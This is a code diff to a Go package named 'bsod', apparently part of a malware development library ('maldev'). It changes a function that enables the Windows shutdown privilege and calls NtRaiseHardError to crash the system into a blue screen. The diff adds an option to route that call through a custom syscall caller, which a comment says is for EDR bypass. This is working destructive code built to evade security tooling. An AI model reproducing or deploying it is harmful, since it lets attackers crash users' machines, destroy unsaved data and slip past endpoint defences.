@@ -1,15 +1,25 @@
+//go:build windows
+
 package bsod
 
 import (
-	"fmt"
+	"errors"
 	"unsafe"
 
 	"github.com/oioio-space/maldev/win/api"
+	wsyscall "github.com/oioio-space/maldev/win/syscall"
+)
+
+var (
+	// ErrPrivilege indicates that privilege elevation failed.
+	ErrPrivilege = errors.New("privilege adjustment failed")
+
+	// ErrHardError indicates that the hard error call failed.
+	ErrHardError = errors.New("hard error call failed")
 )
 
 var (
 	procRtlAdjustPrivilege = api.Ntdll.NewProc("RtlAdjustPrivilege")
-	procNtRaiseHardError   = api.Ntdll.NewProc("NtRaiseHardError")
 )
 
 // seShutdownPrivilege is the privilege index required to shut down the system.
@@ -19,9 +29,12 @@ const seShutdownPrivilege = 19
 // This is a DESTRUCTIVE operation — the system will crash immediately
 // with no opportunity to save data.
 //
-// The error code 0xDEADDEAD is used as the BSOD stop code.
+// When caller is non-nil, NtRaiseHardError is routed through the Caller
+// for EDR bypass. RtlAdjustPrivilege always uses the WinAPI path since
+// it is not typically hooked. Pass nil for standard WinAPI behavior.
+//
 // This function does not return on success.
-func Trigger() error {
+func Trigger(caller *wsyscall.Caller) error {
 	// Enable SeShutdownPrivilege (index 19) for the current process.
 	var wasEnabled int32
 	r1, _, _ := procRtlAdjustPrivilege.Call(
@@ -31,21 +44,29 @@ func Trigger() error {
 		uintptr(unsafe.Pointer(&wasEnabled)),
 	)
 	if r1 != 0 {
-		return fmt.Errorf("privilege elevation failed: NTSTATUS 0x%X", uint32(r1))
+		return ErrPrivilege
 	}
 
 	// Raise a fatal hard error — option 6 = shutdown system.
 	var response uint32
-	r1, _, _ = procNtRaiseHardError.Call(
-		0xDEADDEAD, // error code (appears in crash dump)
-		0,          // number of parameters
-		0,          // unicode string mask
-		0,          // parameters (none)
-		6,          // response option: OptionShutdownSystem
-		uintptr(unsafe.Pointer(&response)),
-	)
-	if r1 != 0 {
-		return fmt.Errorf("hard error failed: NTSTATUS 0x%X", uint32(r1))
+	if caller != nil {
+		r, _ := caller.Call("NtRaiseHardError",
+			0xDEADDEAD,
+			0, 0, 0, 6,
+			uintptr(unsafe.Pointer(&response)),
+		)
+		if r != 0 {
+			return ErrHardError
+		}
+	} else {
+		r1, _, _ = api.Ntdll.NewProc("NtRaiseHardError").Call(
+			0xDEADDEAD,
+			0, 0, 0, 6,
+			uintptr(unsafe.Pointer(&response)),
+		)
+		if r1 != 0 {
+			return ErrHardError
+		}
 	}
 
 	return nil
